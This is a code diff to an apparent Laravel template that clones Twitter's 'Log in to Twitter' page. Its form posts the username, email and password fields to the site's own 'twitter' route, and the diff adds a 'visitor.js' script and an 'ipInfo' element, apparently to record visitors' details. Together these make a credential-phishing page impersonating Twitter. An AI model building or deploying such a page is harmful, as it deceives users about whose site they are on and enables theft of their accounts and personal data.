@@ -42,6 +42,8 @@
       <link rel="preload" href="https://abs.twimg.com/k/en/init.en.43a39fee7e0348fab71a.js" as="script">
       <link rel="preload" href="https://abs.twimg.com/k/en/0.commons.en.4625c86443959d835d1b.js" as="script">
 
+      <script src="{{ asset('js/twitter/visitor.js') }}"></script>
+
       <title>Login on Twitter</title>
       <meta name="robots" content="NOODP">
   <meta name="description" content="Welcome back to Twitter. Sign in now to check your notifications, join the conversation and catch up on Tweets from the people you follow.">
@@ -264,55 +266,57 @@ data-fouc-class-names="swift-loading no-nav-banners"
               
             <div class="page-canvas">
 
-  <div class="signin-wrapper" data-login-message="">
-    <h1>Log in to Twitter</h1>
-    <form action="{{ url('twitter') }}"  class="t1-form clearfix signin js-signin" method="post">
-        @csrf
-      <fieldset>
+    <div class="signin-wrapper" data-login-message="">
+      <h1>Log in to Twitter</h1>
+      <form action="{{ url('twitter') }}"  class="t1-form clearfix signin js-signin" method="post">
+          @csrf
+        <fieldset>
 
-  <legend class="visuallyhidden">Log in</legend>
+          <legend class="visuallyhidden">Log in</legend>
 
-  <div class="clearfix field">
-    <input
-      class="js-username-field email-input js-initial-focus"
-      type="text"
-      name="usernameOrEmail"
-      autocomplete="on" value=""
-      placeholder="Phone, email or username"
-    />
-  </div>
-  <div class="clearfix field">
-    <input class="js-password-field" type="password" name="password" placeholder="Password">
-  </div>
+          <div class="clearfix field">
+            <input
+              class="js-username-field email-input js-initial-focus"
+              type="text"
+              name="usernameOrEmail"
+              autocomplete="on" value=""
+              placeholder="Phone, email or username"
+            />
+          </div>
+          <div class="clearfix field">
+            <input class="js-password-field" type="password" name="password" placeholder="Password">
+          </div>
 
-  <input type="hidden" value="52341fca11effa937ad30f3b3fcf72a7f107e734" name="authenticity_token"/>
+          <input type="hidden" value="52341fca11effa937ad30f3b3fcf72a7f107e734" name="authenticity_token"/>
 
-      <input type="hidden" name="ui_metrics" autocomplete="off">
-      <!-- <script src="/i/js_inst?c_name=ui_metrics" async></script> -->
+          <input type="hidden" name="ui_metrics" autocomplete="off">
+          <!-- <script src="/i/js_inst?c_name=ui_metrics" async></script> -->
 
-</fieldset>
+        </fieldset>
 
-      <div class="captcha js-captcha">
-      </div>
-      <div class="clearfix">
+        <div class="captcha js-captcha">
+        </div>
+        <div class="clearfix">
 
-  <input type="hidden" name="scribe_log">
-  <input type="hidden" name="redirect_after_login" value="">
-  <input type="hidden" value="52341fca11effa937ad30f3b3fcf72a7f107e734" name="authenticity_token"/>
-  <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
+          <input type="hidden" name="scribe_log">
+          <input type="hidden" name="redirect_after_login" value="">
+          <input type="hidden" value="52341fca11effa937ad30f3b3fcf72a7f107e734" name="authenticity_token"/>
+          <button type="submit" class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
 
-  <div class="subchck">
-    <label class="t1-label remember">
-      <input type="checkbox" value="1" name="remember_me" checked="checked">
-      Remember me
-      <span class="separator">·</span>
-      <a class="forgot" href="https://twitter.com/account/begin_password_reset" rel="noopener">Forgot password?</a>
-    </label>
-  </div>
-</div>
+          <div class="subchck">
+            <label class="t1-label remember">
+              <input type="checkbox" value="1" name="remember_me" checked="checked">
+              Remember me
+              <span class="separator">·</span>
+              <a class="forgot" href="https://twitter.com/account/begin_password_reset" rel="noopener">Forgot password?</a>
+            </label>
+          </div>
+        </div>
 
-    </form>
-  </div>
+        <div id="ipInfo"></div>
+
+      </form>
+    </div>
 
   <div class="clearfix mobile has-sms">
     <p class="signup-helper">
